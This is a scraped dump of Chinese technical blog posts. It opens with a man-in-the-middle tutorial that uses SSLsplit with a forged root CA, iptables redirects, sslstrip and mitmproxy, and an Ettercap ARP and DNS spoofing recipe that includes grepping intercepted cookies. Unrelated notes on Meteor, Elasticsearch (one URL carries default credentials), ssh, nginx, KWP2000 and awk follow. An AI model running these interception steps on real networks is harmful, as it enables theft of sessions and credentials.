转向某些域名的流量\n\n改变受害者的默认网关，是最简单的方法。毕竟，我们为了安装CA证书到受害者机器上，也需要物理访问机器。\n\n安装\nhttps://github.com/droe/sslsplit\nDebian上目前只有sslsniff, 没有sslsplit\n\napt-get install libssl-dev libevent-dev\ngit clone https://github.com/droe/sslsplit\ncd sslsplit\nmake\nmkdir /tmp/sslsplit\n\n在sslsplit目录下就生成了一个 可执行文件 sslsplit\n\n4.生成CA证书\n\nopenssl genrsa -out ca.key 4096\nopenssl req -new -x509 -days 1826 -key ca.key -out ca.crt\nopenssl req -new -x509 -days 1826 -key ca.key -out ca.crt -subj \"/C=CN/ST=beijing/L=beijing/O=china/OU=baidu/CN=baidu\"\n\n第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key\n第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)\n这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。\n\n5.启用IP转发和NAT引擎\n假设SSLsplit运行在两个端口 8080用作非SSL的TCP连接，比如 http, smtp, ftp\n8443 用作SSL的连接，比如SMTP over SSL, HTTPS等\n为了转发 到达攻击者机器的IP到 互联网上的端口，可以这么设置\n\nsysctl -w net.ipv4.ipforward=1\niptables -t nat -F\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080\n  HTTPS:\niptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443\n\niptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443\n  SMTP server on port 465\niptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443\n  IMAP on port 143 or via IMAP over SSL on port 993\niptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443\niptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080\nsudo iptables -t nat -N SSLSPLIT\nsudo iptables -t nat -A SSLSPLIT -p tcp --dport 80 -j REDIRECT --to-ports 8080\nsudo iptables -t nat -A SSLSPLIT -p tcp --dport 443 -j REDIRECT --to-ports 8443\n\nenable\niptables -t nat -A PREROUTING -j SSLSPLIT\n\n disable\nsudo iptables -t nat -D PREROUTING -j SSLSPLIT\nmitmproxy sniffing into HTTPS only\nsudo mitmproxy -T --host -e\nsslstrip -a -k -f\nsudo sslstrip -a -k -f -l 10000\n-p , --post                       Log only SSL POSTs. (default)\n-s , --ssl                        Log all SSL traffic to and from server.\n-a , --all                        Log all SSL and HTTP traffic to and from server.\n-l port, --listen=port        Port to listen on (default 10000).\n-f , --favicon                    Substitute a lock favicon on secure requests.\n-k , --killsessions               Kill sessions in progress.\n\nmkdir -p /tmp/sslsplit/logdir/\n6.运行SSLsplit\nsslsplit  -D  -l connections.log  -j /tmp/sslsplit/  -S logdir/  -k ca.key  -c ca.cer   ssl 0.0.0.0 8443   tcp 0.0.0.0 8080\n./sslsplit\n  -D\n  -l connections.log\n  -j /tmp/sslsplit/\n  -S logdir/\n  -k ca.key\n  -c ca.cer\n   ssl 0.0.0.0 8443\n   tcp 0.0.0.0 8080\n\n-D Debug模式，用于输出SSLSplit状态，建议使用时加上\n-l 日志文件\n-j 指定log目录地址\n-S 指定-j参数目录下需要记录截断GET、POST请求的子目录地址\n-k 指定私钥key文件，进行欺骗\n-c 指定Root CA证书文件\nssl IP 端口 指定ssl需要监听的端口\ntcp IP 端口 指定tcp需要监听的端口\n\n最后存储路径为： /tmp/sslsplit/logdir/\ncat /tmp/sslsplit/logdir/\ntail -f /tmp/sslsplit/loggdir/ .log\n查看Cookie: grep -r \"Cookie:\" ./\n\n-D：这是在前台运行 SSLSplit，并不是守护进程，并带有详细的输出。\n-l connections.log：这将每个连接的记录保存到当前目录的connections.log中。\n-j /tmp/sslsplit：这用于建立jail directory目录，/tmp/sslsplit会作为 root（chroot）包含 SSLSplit 的环境。\n-S logdir：这用于告诉 SSLSplit 将内容日志（所有请求和响应）保存到logdir（在jail目录中），并将数据保存到单独的文件中。\n-k和-c：这用于指明和充当 CA 时，SSLSplit 所使用的私钥和证书。\nssl 0.0.0.0 8443：这告诉 SSLSplit 在哪里监听 HTTPS（或者其它加密协议）连接。要记住这是我们在上一章中使用 iptables 从 443 转发的接口。\ntcp 0.0.0.0 8080：这告诉 SSLSplit 在哪里监听 HTTP 连接。要记住这是我们在上一章中使用 iptables 从 80 转发的接口。\n\nmitmproxy 监听 https 比 sslsplit更方便\n\nsslsplit -h\nUsage: sslsplit [options...] [proxyspecs...]\n -c pemfile  use CA cert (and key) from pemfile to sign forged certs\n -k pemfile  use CA key (and cert) from pemfile to sign forged certs\n -C pemfile  use CA chain from pemfile (intermediate and root CA certs)\n -K pemfile  use key from pemfile for leaf certs (default: generate)\n -t certdir  use cert+chain+key PEM files from certdir to target all sites\n\t\t\t\t\t\t matching the common names (non-matching: generate if CA)\n -w gendir   write leaf key and only generated certificates to gendir\n -W gendir   write leaf key and all certificates to gendir\n -O          deny all OCSP requests on all proxyspecs\n -P          passthrough SSL connections if they cannot be split because of\n\t\t\t\t\t\t client cert auth or no matching cert and no CA (default: drop)\n -g pemfile  use DH group params from pemfile (default: keyfiles or auto)\n -G curve    use ECDH named curve (default: prime256v1)\n -Z          disable SSL/TLS compression on all connections\n -r proto    only support one of ssl3 tls10 tls11 tls12 (default: all)\n -R proto    disable one of ssl3 tls10 tls11 tls12 (default: none)\n -s ciphers  use the given OpenSSL cipher suite spec (default: ALL:-aNULL)\n -e engine   specify default NAT engine to use (default: pf)\n -E          list available NAT engines and exit\n -u user     drop privileges to user (default if run as root: nobody)\n -m group    when using -u, override group (default: primary group of user)\n -j jaildir  chroot() to jaildir (impacts sni proxyspecs, see manual page)\n -p pidfile  write pid to pidfile (default: no pid file)\n -l logfile  connect log: log one line summary per connection to logfile\n -L logfile  content log: full data to file or named pipe (excludes -S/-F)\n -S logdir   content log: full data to separate files in dir (excludes -L/-F)\n -F pathspec content log: full data to sep files with % subst (excl. -L/-S):\n\t\t\t\t\t\t %T - initial connection time as an ISO 8601 UTC timestamp\n\t\t\t\t\t\t %d - destination host and port\n\t\t\t\t\t\t %D - destination host\n\t\t\t\t\t\t %p - destination port\n\t\t\t\t\t\t %s - source host and port\n\t\t\t\t\t\t %S - source host\n\t\t\t\t\t\t %q - source port\n\t\t\t\t\t\t %x - base name of local process        (requires -i)\n\t\t\t\t\t\t %X - full path to local process        (requires -i)\n\t\t\t\t\t\t %u - user name or id of local process  (requires -i)\n\t\t\t\t\t\t %g - group name or id of local process (requires -i)\n\t\t\t\t\t\t %% - literal '%'\n\t\t e.g.    \"/var/log/sslsplit/%X/%u-%s-%d-%T.log\"\n -i          look up local process owning each connection for logging\n -d          daemon mode: run in background, log error messages to syslog\n -D          debug mode: run in foreground, log debug messages on stderr\n -V          print version information and exit\n -h          print usage information and exit\n proxyspec = type listenaddr+port [natengine|targetaddr+port|\"sni\"+port]\n\t\t e.g.    http 0.0.0.0 8080 www.roe.ch 80   http/4; static hostname dst\n\t\t\t\t\t\t https ::1 8443 2001:db8::1 443   # https/6; static address dst\n\t\t\t\t\t\t https 127.0.0.1 9443 sni 443     # https/4; SNI DNS lookups\n\t\t\t\t\t\t tcp 127.0.0.1 10025              # tcp/4; default NAT engine\n\t\t\t\t\t\t ssl 2001:db8::2 9999 pf          # ssl/6; NAT engine 'pf'\n\t\t\t\t\t\t autossl ::1 10025                # autossl/6; STARTTLS et al\nExample:\n sslsplit -k ca.key -c ca.pem -P  https 127.0.0.1 8443  https ::1 8443\n\n 8.6 执行 DNS 欺骗并重定向流量\n\n DNS 欺骗是一种攻击，其中执行 MITM 攻击的攻击者使用它来修改响应受害者的 DNS 服务器中的名称解析，发送给他们恶意页面，而不是他们请求的页面，但仍然使用有效名称。\n\n 这个秘籍中，我们会使用 Ettercap 来执行 DNS 欺骗攻击，并在受害者打算浏览别的网站时，使其浏览我们的网站。\n 准备\n\n 对于这个秘籍，我们需要使用我们的 WIndows 客户端虚拟机，但是这次网络识别器桥接到 DNS 解析中。这个秘籍中它的 IP 地址为 192.168.71.14。\n\n 攻击者的机器是我们的 Kali 主机，IP 为 192.168.71.8。它也需要运行 Apache 服务器，并拥有index.html演示页面，我们会包含下列东西：\n\n h1Spoofed SITE/h1\n 操作步骤\n\n     假设我们已经启动了 Apache 服务器，并正确配置了伪造页面，让我们编辑/etc/ettercap/etter.dns，使它仅仅包含下面这一行：\n\n     A 192.168.71.8\n\n     我们仅仅设置一条规则：所有 A 记录（地址记录）都解析到192.168.71.8，这是我们 Kali 的地址。我们可以设置其他条目，但是我们打算在这里避免干扰。\n\n     这次，我们从命令行运行 Ettercap。打开 root 终端并键入下列命令：\n\n     ettercap -i wlan0 -T -P dnsspoof -M arp /192.168.71.14///\n         1\n         1\n\n     它会以文本模式运行 Ettercap，并开启 DNS 欺骗插件来执行 ARP 欺骗攻击，目标仅仅设置为192.168.71.14。\n\n     启动攻击之后，我们来到客户端主机，并尝试通过网站自己的域名来浏览网站，例如，www.yahoo.com，像这样：\n\n     要注意，现在地址和标签栏显示原始站点的名称，但是内容来自不同的地方。\n\n     我们也可以尝试使用nslookup执行地址解析，像这样：\n\n 工作原理\n\n 这个秘籍中，我们看到如何使用中间人攻击来强制用户浏览某个页面，他们甚至相信自己在其它站点上。\n\n 在第一步中，我们修改了 Ettercap 的名称解析文件，让它将所有请求的名称重定向到我们的 Kali 主机。\n\n 之后，我们以下列参数运行 Ettercap：-i wlan0 -T -P dnsspoof -M arp /192.168.71.14///。\n\n     -i wlan0：要技术我们需要客户端进行 DNS 解析，所以我们需要让它连接到桥接的适配器，并到达我们的 Kali 主机，所以我们将嗅探接口设为wlan0（攻击者计算机上的无线网卡）。\n\n     -T：使用纯文本界面。\n\n     -P dnsspoof：启动 DNS 欺骗插件。\n\n     -M arp：执行 ARP 欺骗攻击。\n\n     /192.168.71.14///：这是我们在命令行中对 Ettercap 设置目标的方式：MAC/ip_address/port。其中//表示任何对应 IP 192.168.71.14（客户端）任何端口的 MAC 地址。\n\n 最后，我们确认了攻击能够正常工作。\n 另见\n\n 也有另一个非常实用的用于这些类型攻击的工具，叫做 dnsspoof。你应该下载下来并加入工具库：\n\n man dnsspoof\n\n     1\n\n     1\n\n http://www.monkey.org/~dugsong/dsniff/\n\n 另一个值得提及的工具是中间人攻击框架：MITMf。它包含内建的 ARP 毒化、DNS 欺骗、WPAD 代理服务器，以及其它攻击类型的功能。\n\n mitmf --help","tags":null},{"location":"//blog.pytool.com/Post/前端技术/meteor/2016-03-29 learning-meteor","title":"learning Meteor","text":"0. 简介\r\n\r\nKevin的Meteor介绍 通过一个中文的系列视频，从整个web框架演进的角度让你大致了解一下meteor的先进性以及相关原理，同时做了一个小程序\r\n硅谷排名第1的Web框架 Github排序，比较具有权威性，Meteor是一个划时代的架构\r\nMeteor适合初学者  虽然Meteor很强大，但是学习门槛并不高，很快就可以掌握相关内容\r\nMeteor适合精益创业 实在没有更适合的东西了\r\n\r\n 1. 入门学习\r\n\r\n在入门之前，还需要掌握一些基本的web开发技能，具体参考附录\r\n\r\n第1步\r\n\r\n实操如下教程\r\n官方教程\t入门阅读Blaze版，一步一步操作\r\n\r\n 第2步\r\n\r\n实操如下教程\r\nDiscover Meteor中文版  目前最好的一本中文书，Kevin翻译\r\n\r\n第3步\r\n\r\n实操如下教程\r\nYour First Meteor Application  通过LeaderBoard深入浅出地讲了一些原理，值得细读并操作\r\nYour Second Meteor Application 通过todos深入浅出地讲了一些原理，值得细读并操作\r\n\r\n\r\n 第4步\r\n阅读Meteor文档\r\n反复练习1-3步，每次都会有新体会，直到你觉得完全没有新意为止\r\n\r\n\r\n2. 提高学习\r\n\r\n\r\n 最佳实践\r\n\r\nMeteor Guide Meteor官方给出的最佳实践的文档，在线更新\r\nTodos Meteor官方配合Meteor Guide给出的例程\r\nMantra Arunoda的Meteor最佳实践\r\nBulletproof Meteor教程 Arunoda的教程，相对于其质量而言99美刀一点也不贵\r\n\r\n相关原理\r\n\r\nOptimisticUI\r\nMeteor Methods vs Client-Side Operations\r\nLivequery\r\nMongodb Oplog and Meteor\r\nTracker Manual\r\nRouting Guide\r\n\r\n 3. 专题讨论\r\n\r\n数据\r\n\r\nIntroduction to GraphQL\r\nApollo - The data stack for modern apps\r\n\r\n 4. 参考内容\r\n\r\n开源项目\r\n\r\nTelescope\r\nWekan meteor实现的trello\r\nMeteorHunt\r\nCrowducate\r\nMature Open-source\r\n\r\n 模板项目\r\n\r\n模板项目比较\r\nMeteor Starter\r\nMeteor Admin – Admin dashboard package for meteor\r\nHandlebar Helpers – useful helpers for every app\r\n\r\nBlogs\r\nDiscover Meteor Blog\r\nMannuel Shoebel’s blog\r\nLearn.MeteorFactory\r\nMeteorHacks\r\nMeteorPodcast\r\nHow To Learn Meteor Properly\r\n\r\n\r\n 性能监测\r\n\r\nKadira – Perfomance Monitoring for Meteor\r\nGetting Started With Kadira\r\n\r\n\r\n提问\r\n\r\nMeteor Talk (Google Group) – generally get a response in a day\r\nStack Overflow\r\n\r\n\r\n 5. 附录\r\n\r\n为了掌握meteor，需要在HTML,CSS和JavaScript方面有着比较扎实的基本功\r\n\r\n开发工具\r\n操作系统\r\n首选mac: 开发工具全，可以干所有的事情，包括ios开发\r\n次选ubuntu: 除了不支持ios开发以外，开发起来都差不多，缺点是其他工具太少了\r\n\r\nIDE\r\nWebstorm: 目前最智能的开发IDE\r\nAtom：开源免费，不过需要自己翻墙安装插件\r\n\r\n浏览器\r\nchrome，唯一的选择，跨所有的平台\r\n\r\n数据库工具\r\nmongo shell： 看服务器数据\r\nmongol：看minimongo实时数据\r\nrobomongo：图形化界面看服务器数据\r\n\r\n HTML/CSS/LESS\r\n\r\n基本的\r\nHTML中文教程 中文简单教程\r\nCSS基础 中文简单教程\r\nCodecademy Web教程 英文版实践教程，7小时学完\r\n\r\n高级的\r\nLESS动态样式语言\r\nTwitter Bootstrap – 主站点，有很多好例子\r\nBootstrapZero – prebuilt bootstrap templates from which to learn\r\nBootply – 可以快速测试的实时Bootstrap编辑器\r\nBootstrap CSS\r\nBootsrap元素\r\n\r\nJavascript\r\n\r\nMeteor里面主要是用最新ES6版的js，有些新的概念需要做一些了解\r\n\r\nA Javascript Primer for Meteor(1小时) – DiscoverMeteor书里的简短教程\r\nECMAScript6入门 阮一峰的ECMAScript6入门书，实时在线更新，也鼓励买纸书\r\nJavaScript忍者秘籍\r\nES6 Meteor的ES6说明\r\n\r\n Mongodb\r\n\r\n官方教程 入门教程\r\nData Model Design for MongoDB  数据建模设计\r\n50 Tips and Tricks for MongoDB Developers/50%20Tips%20and%20Tricks%20for%20MongoDB%20Developers%20-%20Kristina%20Chodorow.pdf) MongoDB设计技巧","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic书籍","title":"Awesome Elasticsearch","text":"ELK安装笔记\n书籍\nELKstack 中文指南\n\nLogstash 最佳实践\nElasticsearch 权威指南（中文版）\nElasticsearch权威指南翻译目录 \nElasticsearch Reference 5.3 \n\n Databases -  Tables -  Rows -  Columns\n Indices   -  Types  -  Documents -  Fields\n\n beats\nBeats插件\n\nblog\n邢halo cnblogs合集\ndmvincent\nElastic专栏\nElasticSearch从0到1\n\nElasticsearch使用备忘\nelasticsearch cheatsheet\nnginx elasticsearch secure\n\nElasticsearch 性能优化\n tool\nES可视化工具 VUE\nThe Missing Web UI for Elasticsearch\n http://elastic:changeme@139.129.234.31:9200\ninstall\ndocker run -d --restart=always --name=elasticsearch -p 9200:9200 -v /docker/elastic/searchdata:/usr/share/elasticsearch/data  elasticsearch -E'network.host=0.0.0.0'\n\nkeyword 用于 聚合索引\ntext 用于文本搜索\nstring 弃用，用keyword 或 text 代替\n\nterms 聚合(aggregations)GROUP BY   \"\"aggs\": {    \"allinterests\": { \"terms\": { \"field\": \"interests\" } }  }\n\nelasticsearch Ingest 节点的处理器，相当于 Logstash 的 filter 插件。事实上其主要处理器就是直接移植了 Logstash 的 filter 代码成 Java 版本\n\n[Elasticsearch] 聚合中的重要概念 - Buckets(桶)及Metrics(指标) 说的通俗点，metric很像SQL中的avg、max、min等方法，而bucket就有点类似group by了\n\n但match和term的含义是不一样的：是否对查询字符串进行分词\nmatch：匹配的时候，会将查询的关键字进行分词，然后根据分词后的结果进行查询。\nmatchphrase: 为按短语搜索,会分词,但搜索内容紧邻且顺序一致\nmultimatch: 对多个字段fields进行查询\nterm：直接使用关键字进行查询，不对关键字进行分词。查询的内容还是分词的\n\n在大部分的使用场景下，应该使用match的用法，因为用户的输入往往是比较模糊、顺序不确定、带有多个条件的查询。\n\n相关概念：\n\n(1)Cluster和Node——Elasticsearch中的Cluster是对外提供搜索服务的集群，组成这个集群的各个节点叫Node.集群Cluster是一组有着相同cluster.name的节点，他们协同工作，互相分享数据，提供了故障转移和扩展的功能。Node又分为IndexNode、DataNode等。节点之间是对等关系的(去中心化)，而弱化的Master节点只不过多了维护集群状态的功能。\n\n(2)Shards——Elasticsearch将一个完整的索引分成若干个部分，每个部分就是一个Shards，每个Shard实际上就是一个基于Lucene的索引。Shards的数量一般在索引创建前制定，且索引创建后不能更改。\n\n(3)Replicas——Replics是索引的冗余备份，可用于防止数据丢失或用来做负载均衡。一般地，Elasticsearch会自动对索引请求进行负载均衡。\n\n(4)Recover——在有节点加入或退出集群Cluster或故障节点重新启动时，Elasticsearch会根据机器的负载情况，对索引分片Shards进行重新分配。\n\n(5)River——River是一个运行在Elasticsearch集群内部的插件，主要用来从外部获取以后数据，然后在Elasticsearch里创建索引。常见的有MongoDB、JDBC river Plugin等。\n\n(6)Gateway——是Elasticsearch索引数据快照的存储方式，当Elasticsearch集群关闭再重新启动时，就会从Gateway中读取索引数据快照。Elasticsearch支持多种类型的Gateway,本地文件系统、分布式文件系统、Hadoop的HDFS\n\n(7)Discover.zen——Discover.zen代表Elasticsearch的自动发现节点机制。Zen用来实现节点自动发现和Master节点选举，Master节点负责节点的加入和退出以及分片shard的重新分配。\n\n(8)Transport——Transport代表Elasticsearch内部节点或集群与客户端的交互方式，默认内部是使用TCP协议进行交互的，同时支持HTTP协议(JSON格式)、Thrift、Servlet等传输协议。\n\n(9)Index、Type、Document、Field——Index是数据存储的地方，可以快速高效的堆索引中的数据进行全文索引，类似于RDBMS数据库中的Database;在Index下一般会有多个存储数据的Type,Type类似于Database的table,用来存放具体数据；Document类似于关系数据库的一行数据，在一个Type里的每一个Document都有一个唯一的ID作为区分。\n\n(10)Mapping——Mapping定义索引下的Type的字段处理规则，如索引如何建立、索引数据类型、是否保存原始索引JSON文档，是否需要进行分词处理、如何进行分词处理等。一般地，一个索引文件下能存储不同映像(Mapping)的类型文件(Types).\n\n从图中可以看出，Elasticsearch可以接受来自本机、共享以及云平台上的数据；在Lucene提供的基本功能上，通过构建分布式索引，完成对大数据的索引、搜索等处理。其中，River作为Elasticsearch内部运行的插件，获取其他存储方式的数据到Elasticsearch.Zen用来作为节点自动发现和Master节点选举；EC2(Elastic Copute Cloud)借由Web服务的方式让使用者可以弹性的运行自己的Amazon机器映像，提供可调整的云计算能力。通过提供的Thrift、Memcached、HTTP等方式使用Elasticsearch的API。在顶层，用户可以基于RESTful和客户端的方式通过Elasticsearch API完成数据操作、管理等操作。\nRESTful接口URL的格式是？\n\ncurl -XVERB 'PROTOCOL://HOST/PATH?QUERYSTRING' -d 'BODY'\n\n    VERB HTTP方法：GET(获取), POST(更新), PUT(创建), HEAD, DELETE(删除)\n    PROTOCOL： http或者https协议（只有在Elasticsearch前面有https代理的时候可用）\n    HOST： Elasticsearch集群中的任何一个节点的主机名，如果是在本地的节点，那么就叫localhost\n    PORT： Elasticsearch HTTP服务所在的端口，默认为9200\n    QUERYSTRING： 一些可选的查询请求参数，例如?pretty参数将使请求返回更加美观易读的JSON数据\n    BODY： 一个JSON格式的请求主体（如果请求需要的话）","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 ssh","title":"Linux命令 ssh","text":"---\nssh的连接重用\n牢记25个最佳的SSH命令\n16条技巧让你更高效使用SSH\nssh通过代理连接服务器\nSSH端口中转全攻略\nTunnel：论如何在内网中自由渗透 \nusage: ssh [-1246AaCfGgKkMNnqsTtVvXxYy] [-b bindaddress] [-c cipherspec]\n           [-D [bindaddress:]port] [-E logfile] [-e escapechar]\n           [-F configfile] [-I pkcs11] [-i identityfile] [-L address]\n           [-l loginname] [-m macspec] [-O ctlcmd] [-o option] [-p port]\n           [-Q queryoption] [-R address] [-S ctlpath] [-W host:port]\n           [-w localtun[:remotetun]] [user@]hostname [command]\n\n -b bindaddress  当有多个网卡时,指定绑定的ip\n -c cipher_spec   加密算法   “3des”, “blowfish”, and “des”.","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 useradd","title":"Linux useradd","text":"mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin\nuseradd -r -u 33 -g www-data -c www-data -d /var/www -s /usr/sbin/nologin www-data\nuseradd -o -r -u 501 -g www -c ftp -d /home/wwwroot/default/bizchinalinyi -s /usr/sbin/nologin ftp\n\n-c, --comment comment 指定一段注释性描述。\n-d, --home-dir 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。\n-g, --gid 用户组 指定用户所属的用户组。\n-G 用户组，用户组 指定用户所属的附加组。\n-s, --shell  Shell文件 指定用户的登录Shell。\n-u, --uid UID 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。\n-o, --non-unique 创建uid相同的账户\n-r, --system 创建系统账户uid\u003c1000 递减","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx internal","title":"Linux命令 Nginx internal","text":"nginx 上这个功能叫做 X-Accel-Redirect 。\n\n假设下载文件的路径在 /path/to/files，比如有 /path/to/files/test1.txt 可以在 nginx 里配置\n\nlocation /down {\n     internal;\n     alias   /path/to/files/;\n}\n\ninternal 选项是这个路径只能在 nginx 内部访问。\n\n然后可以在 php 里写\n\nheader(\"X-Accel-Redirect: /down/test1.txt\");\n\n就可以了。\n\n另外，如果在程序那头如果不想要开头的那个“/”，比如想写成 header(\"X-Accel-Redirect: down/test1.txt\"); ，那么在 nginx 的那条 alias 的最后就要加一个 “/”。\n\n什么是sendfile？\nnginx官方只是一句带过，如果你需要了解详细的请参考： http://celebnamer.celebworld.ws/stuff/modxsendfile/\n\n为什么要用sendfile？\n原因很简单，项目中有个需求是后端程序负责把源文件打包加密生成目标文件，然后程序读取目标文件返回给浏览器；这种做法有个致命的缺陷就是占用大量后端程序资源，如果遇到一些访客下载速度巨慢，就会造成大量资源被长期占用得不到释放，很快后端程序就会因为没有资源可用而无法正常提供服务。通常表现就是nginx报502错误！其次在nginx内部我还想实现“由nginx检查目标文件是否存在，如果存在的话就直接返回给浏览器而无需经过后端程序的处理”，这样一来后端程序只是负责生成目标文件，一单目标文件被生成，基本上就不再提供服务，而nginx则提供全静态的文件浏览服务。可想而知，性能的提升还是大很多的！\n\n怎么启用sendfile？\n详细配置步骤就不说了，官方wiki已经说明的比较清楚。只提一下注意点吧：\n1，location 必须 被定义为 internal;\n2，如果在location中使用alias 一定要注意目录结尾的“/”；\n3，要注意location 匹配时尽量只用目录名。 我在测试中遇到抓狂的问题。\n\n先说一下我最终的方案：\n1，增加一个location作为目标文件的检查，如果存在 就发给internal的location继续处理，如果不存在就rewrite到后端程序处理；\nview source\nprint?\nlocation ~ ^/vdir/(.)\\.ext$\n{\n    set $objfile \"$1.ext\";\n    if (!-f /path/to/obj/dir/$objfile)\n    {\n        rewrite ^  /backend/app last;\n    }\n    rewrite ^ /revdir/$objfile last;\n}\n\n以上代码可实现“由nginx检查目标文件是否存在，如果存在的话就直接返回给浏览器而无需经过后端程序的处理”。\n接下来看下sendfile相关的location\nview source\nprint?\nlocation /revdir\n{\n    internal;\n    alias /another/dir/;\n    #rewrite (.) /$1 redirect; # 用于测试匹配到的数据是否正确，也可以使用 addheader  xxx  $1  来代替\n}\n\n程序里送出的header是 ：\nview source\nprint?\nX-Accel-Redirect: /revdir/a/b/xxx.ext\n\n需要再原本的文件路径前加一个虚拟目录 /revdir/\n\n下面讲一下访客在浏览 http://yourdomain/vdir/d/i/r/xxx.ext时的一些处理过程：\n1，nginx会先去检查是否存在目标文件”/path/to/obj/dir/d/i/r/xxx.ext”\n2.1，如果文件不存在，就会发起一个rewrite ，将请求发往后端程序处理生成文件，然后后端程序只送出”X-Accel-Redirect”header之后完成处理，nginx接受X-Accel-Redirect会被 location /revdir 匹配到，继而发送该文件；\n2.1，如果文件存在，也会发起一个rewrite ，然后会被 location /revdir 匹配到，继而直接发送该文件无需经过后端程序;\n3，over.\n\n提醒注意：\n如果你在测试中发现nginx报500，首先一个考虑下是不是重复匹配次数达到nginx内部预设的10次上限，然后报500错误。有方法可以验证，适当的location添加：\nview source\nprint?\nlogsubrequest on;\n\n详细请点击参考官方wiki\n\n最后再提一点，远程文件怎么使用这个功能来转发呢？ 不是proxy喔\n有兴趣的可以参考这里：Nginx-Fu: X-Accel-Redirect From Remote Servers","tags":null},{"location":"//blog.pytool.com/Hardware/车联网/2017-02-04 KWP2000协议解析","title":"KWP2000协议解析","text":"KWP 2000协议是最常用的通信协议之一，是属于OBD II标准协议的一种。KWP系统又称为关键字协议，因为这种协议在系统进入时，会涉及到关键字的校验而得名。下面从物理层特性、系统进入、帧结构、命令交互、交互时间参数、常用命令字等几个方面来介绍这种协议。\nØ  物理层特性：通常采用10416BPS的波特率；空闲电平通常为12V；数据位格式为1+8+1，没有校验位。\nØ  系统进入初始化：有两种初始化方式。第一种由设备先发送25ms的拉低电平，然后是25ms的高电平（空闲电平），然后再发送系统进入数据，系统进入数据通常为5个字节，ECU响应7个字节，完成系统初始化交互。请参见下图：\n设备 ————  \u003c—————ECU\n\n|———————数据区————————|\n\n第二种初始化方式为设备发送5BPS或者200BPS的地址码，ECU响应55H，KW1，KW2，设备对KW2取反发回给ECU，ECU对地址码取反发回给设备，完成系统初始化交互。其中55H这个字节用来规定后面的通信波特率。参见下图\n\nTool——  —         \u003c—        \u003c—              —             \u003c—   ECU\n\nØ  帧结构：命令头（1个或多个字节）+命令体（1个或多个字节）+校验（通常为和校验）。\n在命令头中，包括以下几个部分的内容：格式+目标地址+源地址+长度字节。长度信息有时候在格式字节中体现，则不需要另外的长度字节，长度信息用以表示命令体的内容；目标地址和源地址有时候也会没有。\n命令体的内容中：命令字+命令内容。命令内容可以没有。\n举例如下：\n81H  11H  F1H  81H  04H\n第一个字节81H为格式+长度信息（80+1）\n第二个字节11H为目标地址\n第三个字节F1H为源地址\n第四个字节81H为命令字，表示系统进入\n最后一个字节04H为前面4个字节的校验和\n同样，也可能表现如下：\n80H  11H  F1H  01H  3EH  C1H\n这种情况下，长度字节放在源地址之后\n还可能表现为：\n02H  1AH  9AH  B6H\n这种情况下，格式字节和目标地址源地址都已经没有了\n还有一种特殊的情况，在上一种情况的基础上，在帧数据之前，加一个00，例如：\n00H  02H  1AH  9AH  B6H\n但这种帧结构的情况极少。\nØ  命令交互：命令交互通常情况下为1对1，但也存在1对多或者多对1的情况。下面是一组命令交互举例：\nTools: 81H  31H  F1H  81H  24H\nECU:   83H  F1H  31H  C1H  E9H  8FH  DEH\n在交互中，因为发送命令的对象不一样，所以目标地址和源地址是进行了互换；同时，ECU响应设备的命令字在设备命令字的基础上+0x40。\nØ  交互时间参数：包括4个时间参数，如下：\n设备发送命令字节间的时间间隔P1，通常为5ms\nECU返回命令字节间的时间间隔P2，通常为0ms\n设备发送完一帧命令后等待ECU响应的时间P3，通常为75ms~90ms\n设备接收到ECU响应后到发送下一帧命令的时间P4，通常为20ms~26ms\nØ  常用命令字：\n系统进入：81H\n系统退出：82H\n链路保持：3EH\n读故障码：18H\n清除故障码：14H\n读版本信息：1AH\n读数据流：21H","tags":null},{"location":"//blog.pytool.com/Other/2017-04-01 http代理服务器","title":"五大开源 Web 代理服务器横评：Squid、Privoxy、Varnish、Polipo、Tinyproxy","text":"五大开源 Web 代理服务器横评：Squid、Privoxy、Varnish、Polipo、Tinyproxy\n\napt install tinyproxy\nvi /etc/tinyproxy.conf","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 awk","title":"Linux命令 awk","text":"---\r\nLinux强大命令 Awk 20分钟入门介绍\r\n用awk输出某列字符长度大于规定数值的行\r\n awk '{if(length($3)  30)print $0}' urfile\r\n 要显示长于 72 个字符的文件的行\r\n awk 'length($0)   72' file\r\nShell 按照字符串长度进行排序\r\nawk ' { print length, $0}' file.txt | sort -n | sed 's/. //'\r\n对文件内容按照每行的字符串长度进行排序吗!\r\n\r\nawk '{print length($0),$0}' urfile | sort -k1,1nr | cut -d' ' -f2\r\ncat myfile | awk '{print length, $0}' | sort -rn | sed 's/^[0-9]\\+ //'\r\n\r\n 查看nginx连接数命令\r\nnetstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'\r\n\r\n多行合并一行空格\r\nawk 'BEGIN{b=0} {if($0==\"\"){b=1;next;} if(b){print \"\\n\"$0;b=0;}else print;}' input   output\r\n\r\n\r\ncat .bash_history  | awk '{print $1}' | sort | uniq -c | sort -nr | head -16\r\n\r\n 近输出前两行\r\nawk 'NR\u003c3{print $2,$1}' test.md\r\n\r\n\r\nsudo dpkg -l |awk  -F'-' -v OFS='|' '/zip/{print $1,$2}'\r\n\r\n-v OFS='|' 指定输出分隔符为|\r\n-F'-'      输入分隔符为 -\r\n/zip/      查找zip\r\n{}\r\n\r\n\r\nawk是行处理器: 相比较屏幕处理的优点，在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息\r\nawk处理过程: 